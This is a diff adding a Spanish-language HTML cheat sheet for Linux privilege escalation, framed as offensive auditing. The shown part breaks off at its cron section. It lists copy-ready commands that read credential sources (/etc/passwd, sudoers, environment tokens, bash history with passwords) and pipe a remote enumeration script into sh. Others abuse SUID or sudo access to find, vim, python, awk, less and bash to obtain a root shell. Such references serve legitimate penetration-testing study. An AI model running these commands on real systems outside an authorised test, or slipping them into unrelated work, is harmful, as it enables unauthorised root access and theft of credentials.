@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Linux PrivEsc · Cheatsheet</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:     #070a0e;
+  --bg2:    #0b0f15;
+  --bg3:    #10161f;
+  --bg4:    #141c26;
+  --red:    #ff2d55;
+  --orange: #ff6b35;
+  --yellow: #ffd60a;
+  --cyan:   #00e5ff;
+  --green:  #39ff14;
+  --purple: #bf5af2;
+  --muted:  #2a3a4a;
+  --muted2: #182230;
+  --text:   #c8d6e5;
+  --text2:  #5a7a9a;
+  --border-r: rgba(255,45,85,0.15);
+  --border-o: rgba(255,107,53,0.15);
+  --border-c: rgba(0,229,255,0.12);
+  --border-g: rgba(57,255,20,0.12);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+html { font-size: 14px; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'JetBrains Mono', monospace;
+  min-height: 100svh;
+  overflow-x: hidden;
+}
+
+/* GRAIN */
+body::after {
+  content:''; position:fixed; inset:0; z-index:1000; pointer-events:none; opacity:0.045;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  background-size: 128px;
+}
+
+/* SCANLINES */
+body::before {
+  content:''; position:fixed; inset:0; z-index:999; pointer-events:none;
+  background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.04) 3px, rgba(0,0,0,0.04) 4px);
+}
+
+/* GRID */
+.grid-bg {
+  position:fixed; inset:0; z-index:0; pointer-events:none;
+  background-image:
+    repeating-linear-gradient(0deg, rgba(255,45,85,0.025) 0px, transparent 1px, transparent 50px),
+    repeating-linear-gradient(90deg, rgba(255,45,85,0.025) 0px, transparent 1px, transparent 50px);
+  background-size: 50px 50px;
+}
+
+/* RADIAL GLOW */
+.glow-bg {
+  position:fixed; inset:0; z-index:0; pointer-events:none;
+  background: radial-gradient(ellipse 60% 40% at 50% 0%, rgba(255,45,85,0.07) 0%, transparent 70%);
+}
+
+.wrapper { max-width:480px; margin:0 auto; min-height:100svh; position:relative; z-index:1; }
+
+/* ── HERO ── */
+.hero {
+  position:relative; overflow:hidden;
+  padding: 22px 16px 18px;
+  border-bottom: 1px solid var(--border-r);
+}
+
+.hero-bg {
+  position:absolute; inset:0;
+  background: url('https://images.unsplash.com/photo-1640552435388-a54879e72b28?w=800&q=85') center/cover;
+  animation: slowZoom 16s ease-out forwards;
+  filter: brightness(0.12) saturate(0.4) hue-rotate(300deg);
+}
+
+.hero-overlay {
+  position:absolute; inset:0;
+  background: linear-gradient(180deg, rgba(7,10,14,0.3) 0%, var(--bg) 100%);
+}
+
+.hero-top {
+  position:relative; z-index:1;
+  display:flex; align-items:center; justify-content:space-between;
+  margin-bottom:14px;
+}
+
+.hero-badge {
+  font-family:'Syne',sans-serif;
+  font-size:9px; font-weight:700; letter-spacing:3px; text-transform:uppercase;
+  color:var(--red); border:1px solid var(--red);
+  padding:3px 9px; display:inline-flex; align-items:center; gap:6px;
+}
+
+.hero-badge::before {
+  content:''; width:5px; height:5px; background:var(--red); border-radius:50%;
+  animation: blink 1.2s ease infinite;
+}
+
+.hero-lvl {
+  font-size:9px; color:var(--text2); letter-spacing:2px;
+}
+
+.hero h1 {
+  font-family:'Syne',sans-serif; font-size:28px; font-weight:800; line-height:0.95;
+  color:#fff; position:relative; z-index:1;
+  text-shadow: 0 0 40px rgba(255,45,85,0.4);
+}
+
+.hero h1 em { color:var(--red); font-style:normal; }
+
+.hero-sub {
+  font-size:10px; color:var(--text2); letter-spacing:1.5px;
+  margin-top:5px; position:relative; z-index:1;
+}
+
+.hero-tags {
+  display:flex; gap:6px; flex-wrap:wrap;
+  margin-top:12px; position:relative; z-index:1;
+}
+
+.hero-tag {
+  font-family:'Syne',sans-serif; font-size:9px; font-weight:600;
+  letter-spacing:1px; text-transform:uppercase; padding:3px 8px;
+}
+
+.tag-r { color:var(--red); border:1px solid rgba(255,45,85,0.3); background:rgba(255,45,85,0.07); }
+.tag-o { color:var(--orange); border:1px solid rgba(255,107,53,0.3); background:rgba(255,107,53,0.07); }
+.tag-c { color:var(--cyan); border:1px solid rgba(0,229,255,0.2); background:rgba(0,229,255,0.06); }
+.tag-g { color:var(--green); border:1px solid rgba(57,255,20,0.2); background:rgba(57,255,20,0.06); }
+.tag-p { color:var(--purple); border:1px solid rgba(191,90,242,0.25); background:rgba(191,90,242,0.07); }
+
+/* ── BOTTOM NAV ── */
+.bnav {
+  position:fixed; bottom:0; left:50%; transform:translateX(-50%);
+  width:100%; max-width:480px;
+  background:rgba(7,10,14,0.97); border-top:1px solid var(--border-r);
+  display:flex; z-index:900;
+  backdrop-filter:blur(16px); -webkit-backdrop-filter:blur(16px);
+}
+
+.bnav-btn {
+  flex:1; background:none; border:none; color:var(--text2);
+  font-family:'Syne',sans-serif; font-size:8px; font-weight:700;
+  letter-spacing:0.5px; text-transform:uppercase;
+  padding:9px 2px 13px; cursor:pointer;
+  display:flex; flex-direction:column; align-items:center; gap:4px;
+  transition:color 0.2s; min-height:58px;
+}
+
+.bnav-btn .icon { font-size:15px; }
+.bnav-btn.active { color:var(--red); }
+.bnav-btn.active .icon { filter: drop-shadow(0 0 5px var(--red)); }
+
+/* ── PANELS ── */
+.panel { display:none; padding:12px 14px 110px; animation:fadeUp 0.28s ease; }
+.panel.active { display:block; }
+
+/* ── SECTION HEADER ── */
+.sec-hdr {
+  font-family:'Syne',sans-serif; font-size:10px; font-weight:700;
+  letter-spacing:2.5px; text-transform:uppercase; color:var(--red);
+  padding:10px 0 5px; margin-bottom:10px;
+  display:flex; align-items:center; gap:8px;
+}
+.sec-hdr.cyan { color:var(--cyan); }
+.sec-hdr.orange { color:var(--orange); }
+.sec-hdr.green { color:var(--green); }
+.sec-hdr.purple { color:var(--purple); }
+
+.sec-hdr::after { content:''; flex:1; height:1px; background:linear-gradient(90deg, currentColor, transparent); opacity:0.25; }
+
+/* ── SEARCH ── */
+.search-wrap { position:relative; margin-bottom:12px; }
+.search-wrap input {
+  width:100%; background:var(--bg3); border:1px solid var(--muted);
+  color:var(--text); font-family:'JetBrains Mono',monospace; font-size:13px;
+  padding:10px 14px 10px 36px; outline:none;
+  transition:border-color 0.2s, box-shadow 0.2s;
+}
+.search-wrap input:focus { border-color:var(--red); box-shadow:0 0 20px rgba(255,45,85,0.12); }
+.search-wrap input::placeholder { color:var(--muted); }
+.s-icon { position:absolute; left:12px; top:50%; transform:translateY(-50%); font-size:14px; color:var(--text2); }
+
+/* ── FILTER TABS ── */
+.ftabs { display:flex; gap:5px; flex-wrap:wrap; margin-bottom:12px; }
+.ftab {
+  background:var(--bg3); border:1px solid var(--muted); color:var(--text2);
+  font-family:'Syne',sans-serif; font-size:9px; font-weight:700;
+  letter-spacing:1px; text-transform:uppercase; padding:5px 9px; cursor:pointer;
+  transition:all 0.2s; white-space:nowrap;
+}
+.ftab.active { background:rgba(255,45,85,0.1); border-color:var(--red); color:var(--red); }
+
+/* ── ACCORDION ── */
+.acc {
+  border:1px solid var(--muted2); margin-bottom:8px; overflow:hidden;
+  transition:border-color 0.2s;
+}
+.acc:hover { border-color:rgba(255,45,85,0.2); }
+
+.acc-hdr {
+  background:var(--bg3); padding:10px 14px; cursor:pointer;
+  display:flex; align-items:center; justify-content:space-between; user-select:none;
+}
+
+.acc-title {
+  font-family:'Syne',sans-serif; font-size:10px; font-weight:700;
+  letter-spacing:1.5px; text-transform:uppercase;
+  display:flex; align-items:center; gap:8px;
+}
+
+.acc-dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; }
+
+.acc-meta { display:flex; align-items:center; gap:7px; }
+
+.acc-count {
+  font-family:'Syne',sans-serif; font-size:9px; color:var(--text2);
+  background:var(--bg2); padding:2px 7px; border-radius:10px;
+}
+
+.acc-risk {
+  font-family:'Syne',sans-serif; font-size:8px; font-weight:700;
+  letter-spacing:1px; padding:2px 6px;
+}
+
+.risk-crit { color:var(--red); border:1px solid rgba(255,45,85,0.3); }
+.risk-high { color:var(--orange); border:1px solid rgba(255,107,53,0.3); }
+.risk-med  { color:var(--yellow); border:1px solid rgba(255,214,10,0.3); }
+
+.acc-chev { color:var(--text2); font-size:11px; transition:transform 0.25s; }
+.acc.open .acc-chev { transform:rotate(180deg); }
+
+.acc-body { max-height:0; overflow:hidden; transition:max-height 0.32s cubic-bezier(0.4,0,0.2,1); }
+.acc.open .acc-body { max-height:3000px; }
+
+.acc-desc {
+  padding:8px 14px; font-size:11px; color:var(--text2);
+  border-bottom:1px solid var(--muted2); line-height:1.5;
+}
+
+/* ── CMD ITEM ── */
+.cmd-item {
+  display:flex; align-items:flex-start; justify-content:space-between;
+  padding:7px 14px; border-bottom:1px solid rgba(24,34,48,0.6);
+  gap:8px; transition:background 0.15s;
+}
+.cmd-item:last-child { border-bottom:none; }
+.cmd-item:hover { background:rgba(255,45,85,0.03); }
+
+.cmd-left { display:flex; flex-direction:column; gap:2px; flex:1; min-width:0; }
+
+.cmd-item code {
+  font-family:'JetBrains Mono',monospace; font-size:11.5px;
+  color:var(--green); word-break:break-all; line-height:1.4;
+}
+
+.cmd-item code.red    { color:var(--red); }
+.cmd-item code.orange { color:var(--orange); }
+.cmd-item code.yellow { color:var(--yellow); }
+.cmd-item code.cyan   { color:var(--cyan); }
+.cmd-item code.purple { color:var(--purple); }
+.cmd-item code.white  { color:#e8f4f8; }
+
+.cmd-note {
+  font-size:10px; color:var(--text2); line-height:1.4;
+}
+
+.copy-btn {
+  background:none; border:1px solid var(--muted); color:var(--text2);
+  font-size:11px; padding:4px 7px; cursor:pointer;
+  font-family:'JetBrains Mono',monospace; transition:all 0.2s;
+  flex-shrink:0; min-width:30px; text-align:center; align-self:flex-start;
+  margin-top:2px;
+}
+.copy-btn:hover { border-color:var(--red); color:var(--red); }
+.copy-btn.ok { border-color:var(--green); color:var(--green); }
+
+/* ── HIDDEN ── */
+.acc[data-hidden="true"] { display:none; }
+
+/* ── NO RESULTS ── */
+.no-res { text-align:center; padding:30px; color:var(--text2); font-size:11px; display:none; }
+.no-res.vis { display:block; }
+
+/* ── RESULT COUNT ── */
+.rcount { font-size:10px; color:var(--text2); margin-bottom:10px; letter-spacing:1px; }
+.rcount span { color:var(--red); }
+
+/* ── CARDS (INFO) ── */
+.card {
+  background:var(--bg3); border:1px solid var(--muted2);
+  padding:13px 14px; margin-bottom:10px;
+}
+.card h3 {
+  font-family:'Syne',sans-serif; font-size:10px; font-weight:700;
+  letter-spacing:2px; text-transform:uppercase; margin-bottom:8px;
+}
+.card h3.r { color:var(--red); }
+.card h3.o { color:var(--orange); }
+.card h3.c { color:var(--cyan); }
+.card h3.g { color:var(--green); }
+.card h3.p { color:var(--purple); }
+
+.card p { font-size:11px; color:var(--text2); line-height:1.65; margin-bottom:6px; }
+.card p:last-child { margin-bottom:0; }
+
+.tip  { background:rgba(57,255,20,0.05); border-left:2px solid var(--green); padding:8px 12px; font-size:11px; color:var(--text); line-height:1.6; margin-bottom:8px; }
+.warn { background:rgba(255,45,85,0.07); border-left:2px solid var(--red);   padding:8px 12px; font-size:11px; color:var(--text); line-height:1.6; margin-bottom:8px; }
+.info { background:rgba(0,229,255,0.05); border-left:2px solid var(--cyan);  padding:8px 12px; font-size:11px; color:var(--text); line-height:1.6; margin-bottom:8px; }
+
+/* ── CHIPS ── */
+.chips { display:flex; flex-wrap:wrap; gap:5px; margin-top:6px; }
+.chip {
+  font-size:9px; font-family:'Syne',sans-serif; font-weight:700;
+  letter-spacing:0.5px; padding:3px 8px;
+}
+.cr { color:var(--red);    border:1px solid rgba(255,45,85,0.3);  background:rgba(255,45,85,0.07); }
+.co { color:var(--orange); border:1px solid rgba(255,107,53,0.3); background:rgba(255,107,53,0.07); }
+.cy { color:var(--yellow); border:1px solid rgba(255,214,10,0.25);background:rgba(255,214,10,0.06); }
+.cc { color:var(--cyan);   border:1px solid rgba(0,229,255,0.2);  background:rgba(0,229,255,0.05); }
+.cg { color:var(--green);  border:1px solid rgba(57,255,20,0.2);  background:rgba(57,255,20,0.05); }
+.cp { color:var(--purple); border:1px solid rgba(191,90,242,0.25);background:rgba(191,90,242,0.06); }
+
+/* ── CHECKLIST ── */
+.chk-item {
+  display:flex; align-items:flex-start; gap:10px;
+  padding:8px 0; border-bottom:1px solid var(--muted2);
+  cursor:pointer; user-select:none; transition:opacity 0.2s;
+}
+.chk-item:last-child { border-bottom:none; }
+.chk-item.done { opacity:0.4; }
+
+.chk-box {
+  width:18px; height:18px; border:1px solid var(--muted); flex-shrink:0;
+  margin-top:1px; display:flex; align-items:center; justify-content:center;
+  font-size:10px; transition:all 0.2s;
+}
+.chk-item.done .chk-box { background:var(--red); border-color:var(--red); color:#fff; }
+
+.chk-text { font-size:11.5px; color:var(--text); line-height:1.5; }
+.chk-text code { color:var(--green); font-size:11px; }
+.chk-item.done .chk-text { text-decoration:line-through; color:var(--text2); }
+
+.chk-badge {
+  font-family:'Syne',sans-serif; font-size:8px; font-weight:700;
+  letter-spacing:1px; padding:2px 5px; flex-shrink:0; align-self:flex-start; margin-top:2px;
+}
+
+/* ── PROGRESS ── */
+.prog-wrap { background:var(--bg3); border:1px solid var(--muted2); padding:12px 14px; margin-bottom:14px; }
+.prog-lbl {
+  font-family:'Syne',sans-serif; font-size:9px; font-weight:600;
+  letter-spacing:2px; text-transform:uppercase; color:var(--text2);
+  margin-bottom:6px; display:flex; justify-content:space-between;
+}
+.prog-lbl span { color:var(--red); }
+.prog-bar { height:3px; background:var(--muted2); overflow:hidden; }
+.prog-fill { height:100%; background:linear-gradient(90deg, var(--red), var(--orange)); width:0%; transition:width 0.4s ease; }
+
+/* ── COMBO CARD ── */
+.combo {
+  background:var(--bg3); border:1px solid var(--muted2);
+  padding:12px 14px; margin-bottom:8px;
+}
+.combo-lbl {
+  font-family:'Syne',sans-serif; font-size:9px; font-weight:700;
+  letter-spacing:2px; text-transform:uppercase; color:var(--orange); margin-bottom:5px;
+}
+.combo-code {
+  font-family:'JetBrains Mono',monospace; font-size:11.5px; color:var(--yellow);
+  background:var(--bg2); padding:8px 10px; margin-bottom:6px;
+  display:flex; justify-content:space-between; align-items:flex-start;
+  gap:8px; word-break:break-all; line-height:1.5;
+}
+.combo-desc { font-size:11px; color:var(--text2); line-height:1.5; }
+
+/* ── PHASE BAR ── */
+.phase {
+  display:flex; align-items:stretch; gap:0;
+  margin-bottom:14px; overflow:hidden; border:1px solid var(--muted2);
+}
+.phase-step {
+  flex:1; padding:10px 8px; text-align:center;
+  border-right:1px solid var(--muted2);
+  display:flex; flex-direction:column; gap:4px;
+}
+.phase-step:last-child { border-right:none; }
+.phase-num { font-family:'Syne',sans-serif; font-size:16px; font-weight:800; line-height:1; }
+.phase-txt { font-family:'Syne',sans-serif; font-size:7.5px; font-weight:600; letter-spacing:1px; text-transform:uppercase; color:var(--text2); }
+
+/* ── ANIMATIONS ── */
+@keyframes slowZoom { from{transform:scale(1.07);} to{transform:scale(1);} }
+@keyframes fadeUp { from{opacity:0;transform:translateY(10px);} to{opacity:1;transform:translateY(0);} }
+@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.15;} }
+
+::-webkit-scrollbar { width:3px; }
+::-webkit-scrollbar-track { background:var(--bg); }
+::-webkit-scrollbar-thumb { background:var(--muted); }
+
+/* ════════════════════════════════════════
+   RESPONSIVE — TABLET 768px+
+   ════════════════════════════════════════ */
+@media (min-width: 768px) {
+  html { font-size: 15px; }
+
+  /* Wrapper full-width up to 860px */
+  .wrapper { max-width: 860px; width: 100%; }
+
+  /* Nav: fixed top instead of fixed bottom */
+  .bnav {
+    top: 0; bottom: auto;
+    max-width: 860px;
+    border-top: none; border-bottom: 1px solid var(--border-r);
+    justify-content: flex-start;
+  }
+  .bnav-btn {
+    flex-direction: row; gap: 8px;
+    padding: 12px 20px; min-height: 46px;
+    flex: none; font-size: 9px;
+  }
+  .bnav-btn .icon { font-size: 14px; }
+
+  /* Push hero down so it's not behind the nav */
+  .hero { padding: 72px 24px 26px; }
+  .hero h1 { font-size: 42px; }
+
+  .panel { padding: 16px 20px 40px; }
+}
+
+/* ════════════════════════════════════════
+   RESPONSIVE — DESKTOP 1024px+
+   ════════════════════════════════════════ */
+@media (min-width: 1024px) {
+  .wrapper { max-width: 1280px; }
+  .bnav { max-width: 1280px; }
+
+  .hero { padding: 80px 40px 38px; }
+  .hero h1 { font-size: 62px; }
+  .hero-sub { font-size: 12px; }
+  .hero-badge { font-size: 10px; }
+
+  .panel { padding: 28px 40px 60px; }
+
+  /* Vectores: 2-col accordion grid */
+  #panel-vec {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    column-gap: 18px;
+    align-items: start;
+  }
+  #panel-vec .search-wrap,
+  #panel-vec .ftabs,
+  #panel-vec .rcount,
+  #panel-vec .no-res { grid-column: 1 / -1; }
+
+  /* Shells: 2-col combo grid */
+  #panel-shells {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    column-gap: 18px;
+    align-items: start;
+  }
+  #panel-shells .sec-hdr,
+  #panel-shells .warn,
+  #panel-shells .tip { grid-column: 1 / -1; }
+
+  /* Info: 3-col cards */
+  #panel-info {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    column-gap: 18px;
+    align-items: start;
+  }
+  #panel-info .sec-hdr,
+  #panel-info .tip,
+  #panel-info .warn,
+  #panel-info .info { grid-column: 1 / -1; }
+
+  /* Checklist: 2-col items */
+  #panel-check #chklist {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    column-gap: 18px;
+  }
+  #panel-check .phase,
+  #panel-check .prog-wrap { max-width: 640px; }
+}
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="glow-bg"></div>
+
+<div class="wrapper">
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-bg"></div>
+  <div class="hero-overlay"></div>
+  <div class="hero-top">
+    <div class="hero-badge">ROOT · PRIVESC</div>
+    <div class="hero-lvl">// LINUX</div>
+  </div>
+  <h1>PRIVILEGE<br><em>ESCALATION</em></h1>
+  <div class="hero-sub">// LOCAL LINUX · AUDITORÍA OFENSIVA</div>
+  <div class="hero-tags">
+    <span class="hero-tag tag-r">SUID/SGID</span>
+    <span class="hero-tag tag-o">SUDO</span>
+    <span class="hero-tag tag-c">CRON</span>
+    <span class="hero-tag tag-g">CAPABILITIES</span>
+    <span class="hero-tag tag-p">KERNEL</span>
+  </div>
+</div>
+
+<!-- PANEL: VECTORES -->
+<div class="panel active" id="panel-vec">
+
+  <div class="search-wrap">
+    <span class="s-icon">🔍</span>
+    <input type="text" id="search-in" placeholder="buscar comando..." oninput="doSearch(this.value)">
+  </div>
+
+  <div class="ftabs" id="ftabs">
+    <button class="ftab active" onclick="fcat('all',this)">ALL</button>
+    <button class="ftab" onclick="fcat('enum',this)">ENUM</button>
+    <button class="ftab" onclick="fcat('suid',this)">SUID</button>
+    <button class="ftab" onclick="fcat('sudo',this)">SUDO</button>
+    <button class="ftab" onclick="fcat('cron',this)">CRON</button>
+    <button class="ftab" onclick="fcat('cap',this)">CAPS</button>
+    <button class="ftab" onclick="fcat('write',this)">WRITE</button>
+    <button class="ftab" onclick="fcat('kernel',this)">KERNEL</button>
+  </div>
+
+  <div class="rcount"><span id="rcn">120+</span> técnicas disponibles</div>
+
+  <!-- ENUMERACIÓN INICIAL -->
+  <div class="acc open" data-cat="enum" id="acc-enum">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--cyan)"></div>ENUMERACIÓN INICIAL</div>
+      <div class="acc-meta"><span class="acc-count">12</span><span class="acc-risk risk-med">RECON</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Lo primero que ejecutas al obtener acceso. Mapa completo del sistema antes de explotar.</div>
+      <div class="cmd-item"><div class="cmd-left"><code>id && whoami && hostname</code><div class="cmd-note">Usuario actual, grupos y nombre de máquina</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>cat /etc/passwd | grep -v nologin</code><div class="cmd-note">Usuarios con shell activo</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>cat /etc/os-release && uname -a</code><div class="cmd-note">Versión del SO y kernel</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>ps aux --forest</code><div class="cmd-note">Procesos en ejecución con jerarquía</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>env && cat /proc/self/environ</code><div class="cmd-note">Variables de entorno (tokens, rutas, claves)</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>ip a && netstat -tulpn 2>/dev/null</code><div class="cmd-note">Interfaces y puertos en escucha</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>ss -tulpn</code><div class="cmd-note">Alternativa moderna a netstat</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>cat /etc/crontab; ls -la /etc/cron*</code><div class="cmd-note">Cron global y directorios periódicos</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>find / -writable -type f 2>/dev/null | grep -v proc</code><div class="cmd-note">Archivos escribibles en todo el sistema</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>history; cat ~/.bash_history</code><div class="cmd-note">Historial de comandos — contraseñas en claro frecuentes</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>cat /etc/hosts && route -n</code><div class="cmd-note">Hosts conocidos y tabla de rutas</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>ls -la /home/*/</code><div class="cmd-note">Directorios home y sus permisos</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- HERRAMIENTAS AUTOMÁTICAS -->
+  <div class="acc" data-cat="enum">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--cyan)"></div>ENUM AUTOMÁTICO</div>
+      <div class="acc-meta"><span class="acc-count">5</span><span class="acc-risk risk-med">TOOLS</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Scripts que automatizan la enumeración. Ejecutar siempre que sea posible.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code><div class="cmd-note">LinPEAS — el más completo. Descarga y ejecuta.</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code><div class="cmd-note">LinPEAS directo sin guardar</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && bash linux-exploit-suggester.sh</code><div class="cmd-note">Linux Exploit Suggester — vulnerabilidades de kernel</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && bash lse.sh -l 1</code><div class="cmd-note">LSE — alternativa a LinPEAS, muy limpia</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">python3 -c 'import pty; pty.spawn("/bin/bash")'</code><div class="cmd-note">Upgrade de shell básico a TTY interactiva</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- SUID / SGID -->
+  <div class="acc" data-cat="suid">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--red)"></div>SUID / SGID</div>
+      <div class="acc-meta"><span class="acc-count">8</span><span class="acc-risk risk-crit">CRÍTICO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Binarios con bit SUID que se ejecutan como root. Uno mal configurado = root inmediato.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">find / -perm -4000 -type f 2>/dev/null</code><div class="cmd-note">Todos los binarios SUID del sistema</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">find / -perm -2000 -type f 2>/dev/null</code><div class="cmd-note">Binarios SGID</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">find / -perm -4000 -o -perm -2000 -type f 2>/dev/null</code><div class="cmd-note">SUID y SGID en un solo comando</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">/usr/bin/find . -exec /bin/sh -p \; -quit</code><div class="cmd-note">Explotar SUID en find → shell root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">/usr/bin/vim -c ':!/bin/sh'</code><div class="cmd-note">Explotar SUID en vim → shell root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">/usr/bin/python3 -c 'import os; os.execl("/bin/sh","sh","-p")'</code><div class="cmd-note">SUID en Python → shell root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">/usr/bin/bash -p</code><div class="cmd-note">Si bash tiene SUID, -p preserva euid</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>https://gtfobins.github.io/</code><div class="cmd-note">GTFOBins — referencia completa de exploits por binario</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- SUDO -->
+  <div class="acc" data-cat="sudo">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--orange)"></div>SUDO MAL CONFIGURADO</div>
+      <div class="acc-meta"><span class="acc-count">9</span><span class="acc-risk risk-crit">CRÍTICO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Configuraciones de sudo que permiten escalar sin conocer la contraseña de root.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">sudo -l</code><div class="cmd-note">Ver qué puedes ejecutar como sudo</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">sudo -l -U usuario</code><div class="cmd-note">Ver permisos sudo de otro usuario</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">sudo /bin/bash</code><div class="cmd-note">Si tienes ALL → shell root directa</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">sudo find /etc -exec /bin/sh \;</code><div class="cmd-note">sudo + find para escalar</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">sudo vim -c ':!/bin/bash'</code><div class="cmd-note">sudo + vim → shell root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">sudo python3 -c 'import os; os.system("/bin/bash")'</code><div class="cmd-note">sudo + Python</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">sudo awk 'BEGIN {system("/bin/bash")}'</code><div class="cmd-note">sudo + awk</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">sudo less /etc/passwd → !/bin/sh</code><div class="cmd-note">sudo + less → escribir !/bin/sh dentro</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">cat /etc/sudoers 2>/dev/null</code><div class="cmd-note">Leer sudoers si tienes acceso (NOPASSWD líneas)</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- CRON JOBS -->
+  <div class="acc" data-cat="cron">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
